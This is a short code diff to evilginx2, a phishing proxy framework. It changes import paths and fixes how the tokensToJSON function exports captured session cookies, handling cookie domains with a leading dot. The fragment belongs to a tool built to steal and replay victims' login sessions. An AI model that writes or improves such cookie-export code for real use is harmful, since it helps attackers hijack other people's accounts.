@@ -9,9 +9,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
-	"github.com/kgretzky/evilginx2/parser"
+	"evilginx2/database"
+	"evilginx2/log"
+	"evilginx2/parser"
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
@@ -799,7 +799,10 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*data
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
 			}
-			if domain[:1] != "." {
+			if domain[:1] == "." {
+				c.HostOnly = false
+				c.Domain = domain[1:]
+			} else {
 				c.HostOnly = true
 			}
 			if c.Path == "" {
